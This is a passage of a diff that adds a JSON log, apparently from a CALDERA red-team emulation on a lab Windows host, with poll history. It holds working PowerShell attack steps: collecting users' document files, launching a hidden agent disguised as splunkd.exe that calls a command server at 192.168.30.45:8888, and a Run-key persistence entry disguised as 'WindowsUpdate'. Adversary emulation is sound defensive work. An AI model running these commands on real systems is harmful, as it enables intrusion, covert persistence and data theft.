+          &quot;paw&quot;: &quot;fgdafj&quot;,
+          &quot;command&quot;: &quot;Get-ChildItem C:\\Users -Recurse -Include *.docx,*.pdf,*.txt -ErrorAction SilentlyContinue | Select-Object -First 10 | ForEach-Object {$_.FullName}&quot;,
+          &quot;plaintext_command&quot;: &quot;Get-ChildItem C:\\Users -Recurse -Include *.docx,*.pdf,*.txt -ErrorAction SilentlyContinue | Select-Object -First 10 | ForEach-Object {$_.FullName}&quot;,
+          &quot;status&quot;: 0,
+          &quot;score&quot;: 0,
+          &quot;decide&quot;: &quot;2026-04-02T08:07:32Z&quot;,
+          &quot;pin&quot;: 0,
+          &quot;pid&quot;: &quot;4316&quot;,
+          &quot;facts&quot;: [
+            {
+              &quot;unique&quot;: &quot;host.file.pathC:\\Users\\Administrator\\Desktop\\Nuovo documento di testo.txt&quot;,
+              &quot;trait&quot;: &quot;host.file.path&quot;,
+              &quot;name&quot;: &quot;host.file.path&quot;,
+              &quot;value&quot;: &quot;C:\\Users\\Administrator\\Desktop\\Nuovo documento di testo.txt&quot;,
+              &quot;created&quot;: &quot;2026-04-02T08:08:14Z&quot;,
+              &quot;score&quot;: 1,
+              &quot;source&quot;: &quot;b5989196-5d0b-4eb8-9571-0dc52e4c654b&quot;,
+              &quot;origin_type&quot;: &quot;LEARNED&quot;,
+              &quot;links&quot;: [
+                &quot;adbe4b12-2ce6-4f95-8c27-3d5b067d7f35&quot;
+              ],
+              &quot;relationships&quot;: [],
+              &quot;limit_count&quot;: -1,
+              &quot;collected_by&quot;: [
+                &quot;fgdafj&quot;
+              ],
+              &quot;technique_id&quot;: &quot;T1005&quot;
+            },
+            {
+              &quot;unique&quot;: &quot;host.file.pathC:\\Users\\Administrator\\Downloads\\Sysmon\\Eula.txt&quot;,
+              &quot;trait&quot;: &quot;host.file.path&quot;,
+              &quot;name&quot;: &quot;host.file.path&quot;,
+              &quot;value&quot;: &quot;C:\\Users\\Administrator\\Downloads\\Sysmon\\Eula.txt&quot;,
+              &quot;created&quot;: &quot;2026-04-02T08:08:14Z&quot;,
+              &quot;score&quot;: 1,
+              &quot;source&quot;: &quot;b5989196-5d0b-4eb8-9571-0dc52e4c654b&quot;,
+              &quot;origin_type&quot;: &quot;LEARNED&quot;,
+              &quot;links&quot;: [
+                &quot;adbe4b12-2ce6-4f95-8c27-3d5b067d7f35&quot;
+              ],
+              &quot;relationships&quot;: [],
+              &quot;limit_count&quot;: -1,
+              &quot;collected_by&quot;: [
+                &quot;fgdafj&quot;
+              ],
+              &quot;technique_id&quot;: &quot;T1005&quot;
+            }
+          ],
+          &quot;relationships&quot;: [],
+          &quot;used&quot;: [],
+          &quot;unique&quot;: &quot;adbe4b12-2ce6-4f95-8c27-3d5b067d7f35&quot;,
+          &quot;collect&quot;: &quot;2026-04-02T08:08:12Z&quot;,
+          &quot;finish&quot;: &quot;2026-04-02T08:08:14Z&quot;,
+          &quot;ability&quot;: {
+            &quot;ability_id&quot;: &quot;collection_files&quot;,
+            &quot;tactic&quot;: &quot;collection&quot;,
+            &quot;technique_name&quot;: &quot;Data from Local System&quot;,
+            &quot;technique_id&quot;: &quot;T1005&quot;,
+            &quot;name&quot;: &quot;Sensitive File Discovery&quot;,
+            &quot;description&quot;: &quot;Search for common document types under C:\\Users.&quot;,
+            &quot;executors&quot;: [
+              {
+                &quot;name&quot;: &quot;psh&quot;,
+                &quot;platform&quot;: &quot;windows&quot;,
+                &quot;command&quot;: &quot;Get-ChildItem C:\\Users -Recurse -Include *.docx,*.pdf,*.txt -ErrorAction SilentlyContinue | Select-Object -First 10 | ForEach-Object {$_.FullName}\n&quot;,
+                &quot;code&quot;: null,
+                &quot;language&quot;: null,
+                &quot;build_target&quot;: null,
+                &quot;payloads&quot;: [],
+                &quot;uploads&quot;: [],
+                &quot;timeout&quot;: 120,
+                &quot;parsers&quot;: [],
+                &quot;cleanup&quot;: [],
+                &quot;variations&quot;: [],
+                &quot;additional_info&quot;: {}
+              }
+            ],
+            &quot;requirements&quot;: [],
+            &quot;privilege&quot;: null,
+            &quot;repeatable&quot;: false,
+            &quot;buckets&quot;: [
+              &quot;collection&quot;
+            ],
+            &quot;additional_info&quot;: {},
+            &quot;access&quot;: {},
+            &quot;singleton&quot;: false,
+            &quot;plugin&quot;: &quot;&quot;,
+            &quot;delete_payload&quot;: true
+          },
+          &quot;executor&quot;: {
+            &quot;name&quot;: &quot;psh&quot;,
+            &quot;platform&quot;: &quot;windows&quot;,
+            &quot;command&quot;: &quot;Get-ChildItem C:\\Users -Recurse -Include *.docx,*.pdf,*.txt -ErrorAction SilentlyContinue | Select-Object -First 10 | ForEach-Object {$_.FullName}\n&quot;,
+            &quot;code&quot;: null,
+            &quot;language&quot;: null,
+            &quot;build_target&quot;: null,
+            &quot;payloads&quot;: [],
+            &quot;uploads&quot;: [],
+            &quot;timeout&quot;: 120,
+            &quot;parsers&quot;: [],
+            &quot;cleanup&quot;: [],
+            &quot;variations&quot;: [],
+            &quot;additional_info&quot;: {}
+          },
+          &quot;cleanup&quot;: 0,
+          &quot;visibility&quot;: {
+            &quot;score&quot;: 50,
+            &quot;adjustments&quot;: []
+          },
+          &quot;host&quot;: &quot;WS10&quot;,
+          &quot;output&quot;: &quot;True&quot;,
+          &quot;deadman&quot;: false,
+          &quot;agent_reported_time&quot;: &quot;2026-04-02T08:08:12Z&quot;
+        },
+        {
+          &quot;id&quot;: &quot;77d32750-a1de-4499-85e5-8b77bdbd14e3&quot;,
+          &quot;paw&quot;: &quot;fgdafj&quot;,
+          &quot;command&quot;: &quot;Start-Process C:\\Users\\Public\\splunkd.exe `-ArgumentList \&quot;-server http://192.168.30.45:8888 -group red\&quot; `-WindowStyle Hidden&quot;,
+          &quot;plaintext_command&quot;: &quot;Start-Process C:\\Users\\Public\\splunkd.exe `-ArgumentList \&quot;-server http://192.168.30.45:8888 -group red\&quot; `-WindowStyle Hidden&quot;,
+          &quot;status&quot;: 1,
+          &quot;score&quot;: 0,
+          &quot;decide&quot;: &quot;2026-04-02T08:08:14Z&quot;,
+          &quot;pin&quot;: 0,
+          &quot;pid&quot;: &quot;9808&quot;,
+          &quot;facts&quot;: [],
+          &quot;relationships&quot;: [],
+          &quot;used&quot;: [],
+          &quot;unique&quot;: &quot;77d32750-a1de-4499-85e5-8b77bdbd14e3&quot;,
+          &quot;collect&quot;: &quot;2026-04-02T08:09:01Z&quot;,
+          &quot;finish&quot;: &quot;2026-04-02T08:09:01Z&quot;,
+          &quot;ability&quot;: {
+            &quot;ability_id&quot;: &quot;c2_internal&quot;,
+            &quot;tactic&quot;: &quot;command-and-control&quot;,
+            &quot;technique_name&quot;: &quot;Application Layer Protocol&quot;,
+            &quot;technique_id&quot;: &quot;T1071.001&quot;,
+            &quot;name&quot;: &quot;Internal C2&quot;,
+            &quot;description&quot;: &quot;Start an agent process against the internal CALDERA HTTP listener.&quot;,
+            &quot;executors&quot;: [
+              {
+                &quot;name&quot;: &quot;psh&quot;,
+                &quot;platform&quot;: &quot;windows&quot;,
+                &quot;command&quot;: &quot;Start-Process C:\\Users\\Public\\splunkd.exe `\n-ArgumentList \&quot;-server http://192.168.30.45:8888 -group red\&quot; `\n-WindowStyle Hidden\n&quot;,
+                &quot;code&quot;: null,
+                &quot;language&quot;: null,
+                &quot;build_target&quot;: null,
+                &quot;payloads&quot;: [],
+                &quot;uploads&quot;: [],
+                &quot;timeout&quot;: 60,
+                &quot;parsers&quot;: [],
+                &quot;cleanup&quot;: [],
+                &quot;variations&quot;: [],
+                &quot;additional_info&quot;: {}
+              }
+            ],
+            &quot;requirements&quot;: [],
+            &quot;privilege&quot;: null,
+            &quot;repeatable&quot;: false,
+            &quot;buckets&quot;: [
+              &quot;command-and-control&quot;
+            ],
+            &quot;additional_info&quot;: {},
+            &quot;access&quot;: {},
+            &quot;singleton&quot;: false,
+            &quot;plugin&quot;: &quot;&quot;,
+            &quot;delete_payload&quot;: true
+          },
+          &quot;executor&quot;: {
+            &quot;name&quot;: &quot;psh&quot;,
+            &quot;platform&quot;: &quot;windows&quot;,
+            &quot;command&quot;: &quot;Start-Process C:\\Users\\Public\\splunkd.exe `\n-ArgumentList \&quot;-server http://192.168.30.45:8888 -group red\&quot; `\n-WindowStyle Hidden\n&quot;,
+            &quot;code&quot;: null,
+            &quot;language&quot;: null,
+            &quot;build_target&quot;: null,
+            &quot;payloads&quot;: [],
+            &quot;uploads&quot;: [],
+            &quot;timeout&quot;: 60,
+            &quot;parsers&quot;: [],
+            &quot;cleanup&quot;: [],
+            &quot;variations&quot;: [],
+            &quot;additional_info&quot;: {}
+          },
+          &quot;cleanup&quot;: 0,
+          &quot;visibility&quot;: {
+            &quot;score&quot;: 50,
+            &quot;adjustments&quot;: []
+          },
+          &quot;host&quot;: &quot;WS10&quot;,
+          &quot;output&quot;: &quot;True&quot;,
+          &quot;deadman&quot;: false,
+          &quot;agent_reported_time&quot;: &quot;2026-04-02T08:09:00Z&quot;
+        },
+        {
+          &quot;id&quot;: &quot;4d6ab1d9-1447-493f-b276-eead40153cbb&quot;,
+          &quot;paw&quot;: &quot;fgdafj&quot;,
+          &quot;command&quot;: &quot;New-ItemProperty -Path \&quot;HKCU:\\Software\\Microsoft\\Windows\\CurrentVersion\\Run\&quot; `-Name \&quot;WindowsUpdate\&quot; `-Value \&quot;C:\\Users\\Public\\splunkd.exe\&quot; -Force&quot;,
+          &quot;plaintext_command&quot;: &quot;New-ItemProperty -Path \&quot;HKCU:\\Software\\Microsoft\\Windows\\CurrentVersion\\Run\&quot; `-Name \&quot;WindowsUpdate\&quot; `-Value \&quot;C:\\Users\\Public\\splunkd.exe\&quot; -Force&quot;,
+          &quot;status&quot;: 1,
+          &quot;score&quot;: 0,
+          &quot;decide&quot;: &quot;2026-04-02T08:09:02Z&quot;,
+          &quot;pin&quot;: 0,
+          &quot;pid&quot;: &quot;5168&quot;,
+          &quot;facts&quot;: [],
+          &quot;relationships&quot;: [],
+          &quot;used&quot;: [],
+          &quot;unique&quot;: &quot;4d6ab1d9-1447-493f-b276-eead40153cbb&quot;,
+          &quot;collect&quot;: &quot;2026-04-02T08:09:49Z&quot;,
+          &quot;finish&quot;: &quot;2026-04-02T08:09:49Z&quot;,
+          &quot;ability&quot;: {
+            &quot;ability_id&quot;: &quot;persistence_registry&quot;,
+            &quot;tactic&quot;: &quot;persistence&quot;,
+            &quot;technique_name&quot;: &quot;Registry Run Keys / Startup Folder&quot;,
+            &quot;technique_id&quot;: &quot;T1547.001&quot;,
+            &quot;name&quot;: &quot;Registry Persistence&quot;,
+            &quot;description&quot;: &quot;Create a Run key for persistence.&quot;,
+            &quot;executors&quot;: [
+              {
+                &quot;name&quot;: &quot;psh&quot;,
+                &quot;platform&quot;: &quot;windows&quot;,
+                &quot;command&quot;: &quot;New-ItemProperty -Path \&quot;HKCU:\\Software\\Microsoft\\Windows\\CurrentVersion\\Run\&quot; `\n-Name \&quot;WindowsUpdate\&quot; `\n-Value \&quot;C:\\Users\\Public\\splunkd.exe\&quot; -Force\n&quot;,
+                &quot;code&quot;: null,
+                &quot;language&quot;: null,
+                &quot;build_target&quot;: null,
+                &quot;payloads&quot;: [],
+                &quot;uploads&quot;: [],
+                &quot;timeout&quot;: 60,
+                &quot;parsers&quot;: [],
+                &quot;cleanup&quot;: [],
+                &quot;variations&quot;: [],
+                &quot;additional_info&quot;: {}
+              }
+            ],
+            &quot;requirements&quot;: [],
+            &quot;privilege&quot;: null,
+            &quot;repeatable&quot;: false,
+            &quot;buckets&quot;: [
+              &quot;persistence&quot;
+            ],
+            &quot;additional_info&quot;: {},
+            &quot;access&quot;: {},
+            &quot;singleton&quot;: false,
+            &quot;plugin&quot;: &quot;&quot;,
+            &quot;delete_payload&quot;: true
+          },
+          &quot;executor&quot;: {
+            &quot;name&quot;: &quot;psh&quot;,
+            &quot;platform&quot;: &quot;windows&quot;,
+            &quot;command&quot;: &quot;New-ItemProperty -Path \&quot;HKCU:\\Software\\Microsoft\\Windows\\CurrentVersion\\Run\&quot; `\n-Name \&quot;WindowsUpdate\&quot; `\n-Value \&quot;C:\\Users\\Public\\splunkd.exe\&quot; -Force\n&quot;,
+            &quot;code&quot;: null,
+            &quot;language&quot;: null,
+            &quot;build_target&quot;: null,
+            &quot;payloads&quot;: [],
+            &quot;uploads&quot;: [],
+            &quot;timeout&quot;: 60,
+            &quot;parsers&quot;: [],
+            &quot;cleanup&quot;: [],
+            &quot;variations&quot;: [],
+            &quot;additional_info&quot;: {}
+          },
+          &quot;cleanup&quot;: 0,
+          &quot;visibility&quot;: {
+            &quot;score&quot;: 50,
+            &quot;adjustments&quot;: []
+          },
+          &quot;host&quot;: &quot;WS10&quot;,
+          &quot;output&quot;: &quot;True&quot;,
+          &quot;deadman&quot;: false,
+          &quot;agent_reported_time&quot;: &quot;2026-04-02T08:09:48Z&quot;
+        }
+      ],
+      &quot;auto_close&quot;: true,
+      &quot;visibility&quot;: 51,
+      &quot;objective&quot;: {
+        &quot;id&quot;: &quot;495a9828-cab1-44dd-a0ca-66e58177d8cc&quot;,
+        &quot;name&quot;: &quot;default&quot;,
+        &quot;description&quot;: &quot;This is a default objective that runs forever.&quot;,
+        &quot;goals&quot;: [
+          {
+            &quot;target&quot;: &quot;exhaustion&quot;,
+            &quot;value&quot;: &quot;complete&quot;,
+            &quot;count&quot;: 1048576,
+            &quot;operator&quot;: &quot;==&quot;,
+            &quot;achieved&quot;: false
+          }
+        ],
+        &quot;percentage&quot;: 0.0
+      },
+      &quot;use_learning_parsers&quot;: true,
+      &quot;group&quot;: &quot;red&quot;,
+      &quot;source&quot;: {
+        &quot;id&quot;: &quot;ed32b9c3-9593-4c33-b0db-e2007315096b&quot;,
+        &quot;name&quot;: &quot;basic&quot;,
+        &quot;facts&quot;: [
+          {
+            &quot;unique&quot;: &quot;file.sensitive.extensionwav&quot;,
+            &quot;trait&quot;: &quot;file.sensitive.extension&quot;,
+            &quot;name&quot;: &quot;file.sensitive.extension&quot;,
+            &quot;value&quot;: &quot;wav&quot;,
+            &quot;created&quot;: &quot;2026-04-02T08:06:32Z&quot;,
+            &quot;score&quot;: 1,
+            &quot;source&quot;: &quot;ed32b9c3-9593-4c33-b0db-e2007315096b&quot;,
+            &quot;origin_type&quot;: &quot;SEEDED&quot;,
+            &quot;links&quot;: [],
+            &quot;relationships&quot;: [],
+            &quot;limit_count&quot;: -1,
+            &quot;collected_by&quot;: [],
+            &quot;technique_id&quot;: null
+          },
+          {
+            &quot;unique&quot;: &quot;file.sensitive.extensionyml&quot;,
+            &quot;trait&quot;: &quot;file.sensitive.extension&quot;,
+            &quot;name&quot;: &quot;file.sensitive.extension&quot;,
+            &quot;value&quot;: &quot;yml&quot;,
+            &quot;created&quot;: &quot;2026-04-02T08:06:32Z&quot;,
+            &quot;score&quot;: 1,
+            &quot;source&quot;: &quot;ed32b9c3-9593-4c33-b0db-e2007315096b&quot;,
+            &quot;origin_type&quot;: &quot;SEEDED&quot;,
+            &quot;links&quot;: [],
+            &quot;relationships&quot;: [],
+            &quot;limit_count&quot;: -1,
+            &quot;collected_by&quot;: [],
+            &quot;technique_id&quot;: null
+          },
+          {
+            &quot;unique&quot;: &quot;file.sensitive.extensionpng&quot;,
+            &quot;trait&quot;: &quot;file.sensitive.extension&quot;,
+            &quot;name&quot;: &quot;file.sensitive.extension&quot;,
+            &quot;value&quot;: &quot;png&quot;,
+            &quot;created&quot;: &quot;2026-04-02T08:06:32Z&quot;,
+            &quot;score&quot;: 1,
+            &quot;source&quot;: &quot;ed32b9c3-9593-4c33-b0db-e2007315096b&quot;,
+            &quot;origin_type&quot;: &quot;SEEDED&quot;,
+            &quot;links&quot;: [],
+            &quot;relationships&quot;: [],
+            &quot;limit_count&quot;: -1,
+            &quot;collected_by&quot;: [],
+            &quot;technique_id&quot;: null
+          },
+          {
+            &quot;unique&quot;: &quot;server.malicious.urlkeyloggedsite.com&quot;,
+            &quot;trait&quot;: &quot;server.malicious.url&quot;,
+            &quot;name&quot;: &quot;server.malicious.url&quot;,
+            &quot;value&quot;: &quot;keyloggedsite.com&quot;,
+            &quot;created&quot;: &quot;2026-04-02T08:06:32Z&quot;,
+            &quot;score&quot;: 1,
+            &quot;source&quot;: &quot;ed32b9c3-9593-4c33-b0db-e2007315096b&quot;,
+            &quot;origin_type&quot;: &quot;SEEDED&quot;,
+            &quot;links&quot;: [],
+            &quot;relationships&quot;: [],
+            &quot;limit_count&quot;: -1,
+            &quot;collected_by&quot;: [],
+            &quot;technique_id&quot;: null
+          }
+        ],
+        &quot;rules&quot;: [
+          {
+            &quot;action&quot;: &quot;DENY&quot;,
+            &quot;trait&quot;: &quot;file.sensitive.extension&quot;,
+            &quot;match&quot;: &quot;.*&quot;
+          },
+          {
+            &quot;action&quot;: &quot;ALLOW&quot;,
+            &quot;trait&quot;: &quot;file.sensitive.extension&quot;,
+            &quot;match&quot;: &quot;png&quot;
+          },
+          {
+            &quot;action&quot;: &quot;ALLOW&quot;,
+            &quot;trait&quot;: &quot;file.sensitive.extension&quot;,
+            &quot;match&quot;: &quot;yml&quot;
+          },
+          {
+            &quot;action&quot;: &quot;ALLOW&quot;,
+            &quot;trait&quot;: &quot;file.sensitive.extension&quot;,
+            &quot;match&quot;: &quot;wav&quot;
+          }
+        ],
+        &quot;adjustments&quot;: [],
+        &quot;relationships&quot;: [],
+        &quot;plugin&quot;: &quot;stockpile&quot;
+      }
+    },
+    &quot;api_mode&quot;: &quot;v2&quot;,
+    &quot;poll_history&quot;: [
+      {
+        &quot;ts&quot;: &quot;2026-04-02T08:06:35Z&quot;,
+        &quot;state&quot;: &quot;running&quot;,
+        &quot;links&quot;: 1,
+        &quot;potential_links&quot;: 1124,
+        &quot;event_logs&quot;: 0
+      },
+      {
+        &quot;ts&quot;: &quot;2026-04-02T08:06:39Z&quot;,
+        &quot;state&quot;: &quot;running&quot;,
+        &quot;links&quot;: 1,
+        &quot;potential_links&quot;: 1124,
+        &quot;event_logs&quot;: 0
+      },
+      {
+        &quot;ts&quot;: &quot;2026-04-02T08:06:43Z&quot;,
+        &quot;state&quot;: &quot;running&quot;,
+        &quot;links&quot;: 1,
+        &quot;potential_links&quot;: 1124,
+        &quot;event_logs&quot;: 0
+      },
+      {
+        &quot;ts&quot;: &quot;2026-04-02T08:06:48Z&quot;,
+        &quot;state&quot;: &quot;running&quot;,
+        &quot;links&quot;: 2,
+        &quot;potential_links&quot;: 1124,
+        &quot;event_logs&quot;: 0
+      },
+      {
+        &quot;ts&quot;: &quot;2026-04-02T08:06:52Z&quot;,
+        &quot;state&quot;: &quot;running&quot;,
+        &quot;links&quot;: 2,
+        &quot;potential_links&quot;: 1124,
+        &quot;event_logs&quot;: 0
+      },
+      {
+        &quot;ts&quot;: &quot;2026-04-02T08:06:56Z&quot;,
+        &quot;state&quot;: &quot;running&quot;,
+        &quot;links&quot;: 2,
+        &quot;potential_links&quot;: 1124,
+        &quot;event_logs&quot;: 0
+      },
+      {
+        &quot;ts&quot;: &quot;2026-04-02T08:07:00Z&quot;,
+        &quot;state&quot;: &quot;running&quot;,
+        &quot;links&quot;: 2,
+        &quot;potential_links&quot;: 1124,
+        &quot;event_logs&quot;: 0
+      },
+      {
+        &quot;ts&quot;: &quot;2026-04-02T08:07:05Z&quot;,
+        &quot;state&quot;: &quot;running&quot;,
+        &quot;links&quot;: 2,
+        &quot;potential_links&quot;: 1124,
+        &quot;event_logs&quot;: 0
+      },
+      {
+        &quot;ts&quot;: &quot;2026-04-02T08:07:09Z&quot;,
+        &quot;state&quot;: &quot;running&quot;,
+        &quot;links&quot;: 2,
+        &quot;potential_links&quot;: 1124,
+        &quot;event_logs&quot;: 0
+      },
+      {
+        &quot;ts&quot;: &quot;2026-04-02T08:07:13Z&quot;,
+        &quot;state&quot;: &quot;running&quot;,
+        &quot;links&quot;: 2,
+        &quot;potential_links&quot;: 1124,
+        &quot;event_logs&quot;: 0
+      },
+      {
+        &quot;ts&quot;: &quot;2026-04-02T08:07:18Z&quot;,
+        &quot;state&quot;: &quot;running&quot;,
+        &quot;links&quot;: 2,
+        &quot;potential_links&quot;: 1124,
+        &quot;event_logs&quot;: 0
+      },
+      {
+        &quot;ts&quot;: &quot;2026-04-02T08:07:22Z&quot;,
+        &quot;state&quot;: &quot;running&quot;,
+        &quot;links&quot;: 2,
+        &quot;potential_links&quot;: 1124,
+        &quot;event_logs&quot;: 0
+      },
+      {
+        &quot;ts&quot;: &quot;2026-04-02T08:07:26Z&quot;,
+        &quot;state&quot;: &quot;running&quot;,
+        &quot;links&quot;: 2,
+        &quot;potential_links&quot;: 1124,
+        &quot;event_logs&quot;: 0
+      },
+      {
+        &quot;ts&quot;: &quot;2026-04-02T08:07:31Z&quot;,
+        &quot;state&quot;: &quot;running&quot;,
+        &quot;links&quot;: 2,
+        &quot;potential_links&quot;: 1124,
+        &quot;event_logs&quot;: 0
+      },
+      {
+        &quot;ts&quot;: &quot;2026-04-02T08:07:35Z&quot;,
+        &quot;state&quot;: &quot;running&quot;,
+        &quot;links&quot;: 3,
+        &quot;potential_links&quot;: 1124,
+        &quot;event_logs&quot;: 0
+      },
+      {
+        &quot;ts&quot;: &quot;2026-04-02T08:07:40Z&quot;,
+        &quot;state&quot;: &quot;running&quot;,
+        &quot;links&quot;: 3,
+        &quot;potential_links&quot;: 1124,
+        &quot;event_logs&quot;: 0
+      },
+      {
+        &quot;ts&quot;: &quot;2026-04-02T08:07:44Z&quot;,
+        &quot;state&quot;: &quot;running&quot;,
+        &quot;links&quot;: 3,
+        &quot;potential_links&quot;: 1124,
+        &quot;event_logs&quot;: 0
+      },
+      {
+        &quot;ts&quot;: &quot;2026-04-02T08:07:48Z&quot;,
+        &quot;state&quot;: &quot;running&quot;,
+        &quot;links&quot;: 3,
+        &quot;potential_links&quot;: 1124,
+        &quot;event_logs&quot;: 0
+      },
+      {
+        &quot;ts&quot;: &quot;2026-04-02T08:07:52Z&quot;,
+        &quot;state&quot;: &quot;running&quot;,
+        &quot;links&quot;: 3,
+        &quot;potential_links&quot;: 1124,
+        &quot;event_logs&quot;: 0
+      },
+      {
+        &quot;ts&quot;: &quot;2026-04-02T08:07:57Z&quot;,
+        &quot;state&quot;: &quot;running&quot;,
+        &quot;links&quot;: 3,
+        &quot;potential_links&quot;: 1124,
+        &quot;event_logs&quot;: 0
+      },
+      {
+        &quot;ts&quot;: &quot;2026-04-02T08:08:01Z&quot;,
+        &quot;state&quot;: &quot;running&quot;,
+        &quot;links&quot;: 3,
+        &quot;potential_links&quot;: 1124,
+        &quot;event_logs&quot;: 0
+      },
+      {
+        &quot;ts&quot;: &quot;2026-04-02T08:08:05Z&quot;,
+        &quot;state&quot;: &quot;running&quot;,
+        &quot;links&quot;: 3,
+        &quot;potential_links&quot;: 1124,
+        &quot;event_logs&quot;: 0
+      },
+      {
+        &quot;ts&quot;: &quot;2026-04-02T08:08:09Z&quot;,
+        &quot;state&quot;: &quot;running&quot;,
+        &quot;links&quot;: 3,
+        &quot;potential_links&quot;: 1124,
+        &quot;event_logs&quot;: 0
+      },
+      {
+        &quot;ts&quot;: &quot;2026-04-02T08:08:14Z&quot;,
+        &quot;state&quot;: &quot;running&quot;,
+        &quot;links&quot;: 3,
+        &quot;potential_links&quot;: 1124,
+        &quot;event_logs&quot;: 0
+      },
+      {
+        &quot;ts&quot;: &quot;2026-04-02T08:08:18Z&quot;,
+        &quot;state&quot;: &quot;running&quot;,
+        &quot;links&quot;: 4,
+        &quot;potential_links&quot;: 1124,
+        &quot;event_logs&quot;: 0
+      },
+      {
+        &quot;ts&quot;: &quot;2026-04-02T08:08:22Z&quot;,
+        &quot;state&quot;: &quot;running&quot;,
+        &quot;links&quot;: 4,
+        &quot;potential_links&quot;: 1124,
+        &quot;event_logs&quot;: 0
+      },
+      {
+        &quot;ts&quot;: &quot;2026-04-02T08:08:27Z&quot;,
+        &quot;state&quot;: &quot;running&quot;,
+        &quot;links&quot;: 4,
+        &quot;potential_links&quot;: 1124,
+        &quot;event_logs&quot;: 0
+      },
+      {
+        &quot;ts&quot;: &quot;2026-04-02T08:08:31Z&quot;,
+        &quot;state&quot;: &quot;running&quot;,
+        &quot;links&quot;: 4,
+        &quot;potential_links&quot;: 1124,
+        &quot;event_logs&quot;: 0
+      },
+      {
+        &quot;ts&quot;: &quot;2026-04-02T08:08:35Z&quot;,
+        &quot;state&quot;: &quot;running&quot;,
+        &quot;links&quot;: 4,
+        &quot;potential_links&quot;: 1124,
+        &quot;event_logs&quot;: 0
+      },
+      {
+        &quot;ts&quot;: &quot;2026-04-02T08:08:39Z&quot;,
+        &quot;state&quot;: &quot;running&quot;,
+        &quot;links&quot;: 4,
+        &quot;potential_links&quot;: 1124,
+        &quot;event_logs&quot;: 0
+      },
+      {
+        &quot;ts&quot;: &quot;2026-04-02T08:08:44Z&quot;,
+        &quot;state&quot;: &quot;running&quot;,
+        &quot;links&quot;: 4,
+        &quot;potential_links&quot;: 1124,
+        &quot;event_logs&quot;: 0
+      },
+      {
+        &quot;ts&quot;: &quot;2026-04-02T08:08:48Z&quot;,
+        &quot;state&quot;: &quot;running&quot;,
+        &quot;links&quot;: 4,
+        &quot;potential_links&quot;: 1124,
+        &quot;event_logs&quot;: 0
+      },
+      {
+        &quot;ts&quot;: &quot;2026-04-02T08:08:52Z&quot;,
+        &quot;state&quot;: &quot;running&quot;,
+        &quot;links&quot;: 4,
+        &quot;potential_links&quot;: 1124,
+        &quot;event_logs&quot;: 0
+      },
+      {
+        &quot;ts&quot;: &quot;2026-04-02T08:08:56Z&quot;,
+        &quot;state&quot;: &quot;running&quot;,
+        &quot;links&quot;: 4,
+        &quot;potential_links&quot;: 1124,
+        &quot;event_logs&quot;: 0
+      },
+      {
+        &quot;ts&quot;: &quot;2026-04-02T08:09:01Z&quot;,
+        &quot;state&quot;: &quot;running&quot;,
+        &quot;links&quot;: 4,
+        &quot;potential_links&quot;: 1124,
+        &quot;event_logs&quot;: 0
+      },
+      {
+        &quot;ts&quot;: &quot;2026-04-02T08:09:05Z&quot;,
+        &quot;state&quot;: &quot;running&quot;,
+        &quot;links&quot;: 5,
+        &quot;potential_links&quot;: 1124,
+        &quot;event_logs&quot;: 0
+      },
+      {
+        &quot;ts&quot;: &quot;2026-04-02T08:09:09Z&quot;,
+        &quot;state&quot;: &quot;running&quot;,
+        &quot;links&quot;: 5,
+        &quot;potential_links&quot;: 1124,
+        &quot;event_logs&quot;: 0
+      },
+      {
+        &quot;ts&quot;: &quot;2026-04-02T08:09:14Z&quot;,
+        &quot;state&quot;: &quot;running&quot;,
+        &quot;links&quot;: 5,
+        &quot;potential_links&quot;: 1124,
+        &quot;event_logs&quot;: 0
+      },
+      {
+        &quot;ts&quot;: &quot;2026-04-02T08:09:18Z&quot;,
+        &quot;state&quot;: &quot;running&quot;,
+        &quot;links&quot;: 5,
+        &quot;potential_links&quot;: 1124,
+        &quot;event_logs&quot;: 0
+      },
+      {
+        &quot;ts&quot;: &quot;2026-04-02T08:09:22Z&quot;,
+        &quot;state&quot;: &quot;running&quot;,
+        &quot;links&quot;: 5,
+        &quot;potential_links&quot;: 1124,
+        &quot;event_logs&quot;: 0
+      },
+      {
+        &quot;ts&quot;: &quot;2026-04-02T08:09:26Z&quot;,
+        &quot;state&quot;: &quot;running&quot;,
+        &quot;links&quot;: 5,
+        &quot;potential_links&quot;: 1124,
+        &quot;event_logs&quot;: 0
+      },
+      {
+        &quot;ts&quot;: &quot;2026-04-02T08:09:31Z&quot;,
+        &quot;state&quot;: &quot;running&quot;,
+        &quot;links&quot;: 5,
+        &quot;potential_links&quot;: 1124,
+        &quot;event_logs&quot;: 0
+      },
+      {
+        &quot;ts&quot;: &quot;2026-04-02T08:09:35Z&quot;,
+        &quot;state&quot;: &quot;running&quot;,
+        &quot;links&quot;: 5,
+        &quot;potential_links&quot;: 1124,
+        &quot;event_logs&quot;: 0
+      },
+      {
+        &quot;ts&quot;: &quot;2026-04-02T08:09:39Z&quot;,
+        &quot;state&quot;: &quot;running&quot;,
+        &quot;links&quot;: 5,
+        &quot;potential_links&quot;: 1124,
+        &quot;event_logs&quot;: 0
+      },
+      {
+        &quot;ts&quot;: &quot;2026-04-02T08:09:44Z&quot;,
+        &quot;state&quot;: &quot;running&quot;,
+        &quot;links&quot;: 5,
+        &quot;potential_links&quot;: 1124,
+        &quot;event_logs&quot;: 0
+      },
+      {
+        &quot;ts&quot;: &quot;2026-04-02T08:09:48Z&quot;,
+        &quot;state&quot;: &quot;running&quot;,
+        &quot;links&quot;: 5,
+        &quot;potential_links&quot;: 1124,
+        &quot;event_logs&quot;: 0
+      },
+      {
+        &quot;ts&quot;: &quot;2026-04-02T08:09:50Z&quot;,
+        &quot;state&quot;: &quot;finished&quot;,
+        &quot;links&quot;: 5,
+        &quot;potential_links&quot;: 0,
+        &quot;event_logs&quot;: 0
+      },
+      {
+        &quot;ts&quot;: &quot;2026-04-02T08:09:53Z&quot;,
+        &quot;state&quot;: &quot;finished&quot;,
+        &quot;links&quot;: 5,
+        &quot;potential_links&quot;: 0,
+        &quot;event_logs&quot;: 0
+      },
+      {
+        &quot;ts&quot;: &quot;2026-04-02T08:09:56Z&quot;,
+        &quot;state&quot;: &quot;finished&quot;,
+        &quot;links&quot;: 5,
+        &quot;potential_links&quot;: 0,
+        &quot;event_logs&quot;: 0
+      },
+      {
+        &quot;ts&quot;: &quot;2026-04-02T08:09:59Z&quot;,
+        &quot;state&quot;: &quot;finished&quot;,
+        &quot;links&quot;: 5,
+        &quot;potential_links&quot;: 0,
+        &quot;event_logs&quot;: 0
+      },
+      {
+        &quot;ts&quot;: &quot;2026-04-02T08:10:01Z&quot;,
